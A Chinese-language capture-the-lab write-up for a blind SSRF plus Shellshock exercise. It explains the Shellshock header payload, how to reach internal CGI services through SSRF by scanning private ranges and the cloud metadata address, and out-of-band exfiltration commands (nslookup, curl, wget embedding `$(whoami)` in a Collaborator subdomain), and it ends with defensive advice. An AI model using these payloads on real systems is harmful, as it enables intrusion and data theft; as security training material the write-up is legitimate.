# 盲SSRF配合Shellshock漏洞

> 官方名：Blind SSRF with Shellshock exploitation。核心：利用一个盲 SSRF 去访问内网里存在 Shellshock 漏洞的 CGI/Bash 服务，再通过命令执行把结果带出到 Collaborator。

## 知识点：Shellshock 是什么

Shellshock 是 Bash 的命令执行漏洞，本质是：

```text
攻击者控制环境变量
        ↓
Bash 把环境变量里的函数定义后面的内容也执行
```

典型 payload：

```bash
() { :; }; <命令>
```

例如：

```bash
() { :; }; id
```

在 CGI 场景里，很多 HTTP 头会被转换成环境变量，例如：

```http
User-Agent: () { :; }; <命令>
```

后端可能把它变成：

```bash
HTTP_USER_AGENT='() { :; }; <命令>'
```

如果后端启动了 Bash 并读取这个环境变量，就可能执行 `<命令>`。

---

## 知识点：为什么和盲 SSRF 结合

这关的链路是：

```text
你 → 目标网站
        ↓
    目标网站存在盲 SSRF
        ↓
    让它请求内网服务
        ↓
    内网服务是 CGI + Bash
        ↓
    User-Agent 里的 Shellshock payload 触发命令执行
        ↓
    命令结果通过 DNS / HTTP 带出到 Collaborator
```

关键点：

1. **你看不到内网响应**
2. **你也不知道内网 IP**
3. **你只能通过带外信号确认命中**

---

## 通关思路

### 1. 先确认盲 SSRF

找一个能让服务器代你发请求的功能点，例如库存查询。

确认方式：

```text
stockApi / Referer / path 等参数
        ↓
指向 Collaborator 域名
        ↓
Collaborator 出现 DNS / HTTP 交互
```

这一步只证明：

```text
服务器确实会替你发包
```

---

### 2. 再确认 Shellshock 触发点

在这类 CGI 场景里，常见触发点是：

```http
User-Agent
Referer
Cookie
```

你现在已经确认的是：

```text
User-Agent → 能触发命令执行
```

那么就固定这个头，不要乱换。

---

### 3. 构造带外回传的命令

因为你看不到命令输出，所以要让它主动访问你能收到记录的地址。

最常用的是 DNS：

```bash
nslookup $(whoami).你的Collaborator域名
```

如果系统没有 `nslookup`，可以换成：

```bash
curl http://$(whoami).你的Collaborator域名
wget http://$(whoami).你的Collaborator域名
ping -c 1 $(whoami).你的Collaborator域名
```

重点是：

```text
把命令执行结果拼进子域名
```

例如：

```text
whoami = wiener
Collaborator = abc.oastify.com
实际查询 = wiener.abc.oastify.com
```

你在 Collaborator 里看到的子域名前缀，就是命令结果。

---

## 为什么 SSRF 地址正确才能触发 RCE

你现在的理解是对的：

```text
SSRF 地址不正确 → 请求根本到不了那个 Bash 服务
SSRF 地址正确   → 请求打到 CGI/Bash 服务
                  ↓
              User-Agent 变成环境变量
                  ↓
              Shellshock 执行命令
```

所以：

```text
RCE 不是直接从外网触发的
RCE 是通过 SSRF 让目标服务器访问内网服务后触发的
```

---

## 实战中不知道 IP 怎么办

### 1. 先扫常见内网段

如果你不知道内网网段，优先尝试：

```text
127.0.0.0/8
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
169.254.169.254
```

其中：

- `127.0.0.1`：本机
- `10.x.x.x / 172.16-31.x.x / 192.168.x.x`：常见内网
- `169.254.169.254`：云元数据地址

---

### 2. 再扫常见端口

优先扫：

```text
80
443
8000
8080
8443
3000
5000
```

在靶场里，这类 CGI 服务常见端口是：

```text
8080
```

---

### 3. 用带外信号判断命中

因为你不知道哪个 IP 有 Bash 服务，也不能靠肉眼判断，所以让每个请求都带上同一个 Shellshock payload，然后观察：

```text
哪个 IP 让 Collaborator 出现额外交互
```

命中时通常会有：

```text
DNS 查询
HTTP 请求
```

这就是你要找的那个内网地址。

---

## 实战中不知道 Bash 版本怎么办

### 1. 不需要先知道版本

Shellshock 的 payload 本身就是探测：

```bash
() { :; }; <命令>
```

- 如果目标存在漏洞 → `<命令>` 执行
- 如果目标不存在漏洞 → 没有命令执行

所以你不需要先确认 Bash 版本，直接用 payload 试就行。

---

### 2. 如果想更稳一点

可以先看这些信息：

```http
Server:
X-Powered-By:
X-AspNet-Version:
```

如果响应里有：

```text
CGI
Bash
Shell
```

相关线索，就更值得优先测试。

---

### 3. 常见可利用场景

```text
CGI 脚本
老版 Bash
某些嵌入式设备
某些老旧网关
```

Shellshock 在现实中已经比较少见，但在靶场里依然是经典链路。

---

## 我踩过的坑

### 1. 以为 `Referer` 和 `User-Agent` 是同一个东西

```text
User-Agent → 负责触发 Shellshock
Referer    → 负责告诉服务器请求哪个地址
```

它们不是同一个功能点。

在这关里，你要同时控制：

```http
User-Agent: () { :; }; <命令>
Referer: http://<内网IP>:<端口>/
```

或者：

```http
stockApi=http://<内网IP>:<端口>/
User-Agent: () { :; }; <命令>
```

具体是哪个参数，要看应用逻辑。

---

### 2. 不知道内网 IP

解决办法：

```text
扫 192.168.0.0/24
```

重点不是“猜”，而是：

```text
每个 IP 都发一次带 payload 的请求
看哪个 IP 触发 Collaborator 回连
```

---

### 3. 不知道命令是否执行

因为这是盲 SSRF，你看不到输出。

所以必须让命令产生外部可见信号：

```bash
nslookup $(whoami).你的Collaborator域名
```

只要 Collaborator 出现子域名查询，就说明命令执行成功。

---

## 防御建议

- 修复 Shellshock，升级 Bash
- 禁止 CGI 直接把用户可控 HTTP 头原样传给 Bash
- 不允许应用向任意用户指定 URL 发请求
- 出网请求使用白名单
- 禁止访问内网地址、回环地址、云元数据地址
- 网络分区，管理接口不要暴露给应用服务器
- 对命令执行、异常 DNS 查询做告警
